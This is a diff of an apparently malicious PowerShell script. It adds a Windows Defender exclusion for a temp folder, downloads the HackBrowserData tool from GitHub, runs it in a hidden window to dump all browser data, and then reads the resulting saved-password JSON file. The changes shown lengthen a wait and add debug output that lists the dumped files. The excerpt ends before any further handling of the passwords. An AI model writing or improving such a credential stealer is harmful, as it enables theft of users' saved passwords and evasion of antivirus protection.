@@ -37,8 +37,8 @@ try {
     Add-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
     
     # Download newer HackBrowserData version with Windows 11 support
-    $hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
-    $zipPath = "$tempDir\hbd.zip"
+$hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
+$zipPath = "$tempDir\hbd.zip"
     
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-WebRequest -Uri $hbdUrl -OutFile $zipPath -UseBasicParsing
@@ -52,7 +52,14 @@ try {
     if(Test-Path $exePath) {
         # Try to run with admin privileges
         Start-Process -FilePath $exePath -ArgumentList "-b all -f json --dir $tempDir" -WindowStyle Hidden -Wait
-        Start-Sleep -Seconds 5
+        Start-Sleep -Seconds 10
+        
+        # Debug: List all files in temp directory
+        $allFiles = Get-ChildItem -Path $tempDir -Recurse
+        $debugInfo = "Files found: " + ($allFiles.Count) + "`n"
+        foreach($file in $allFiles) {
+            $debugInfo += $file.Name + "`n"
+        }
         
         # Read the password file
         $jsonFile = Get-ChildItem -Path $tempDir -Filter "*password*.json" -Recurse | Select-Object -First 1
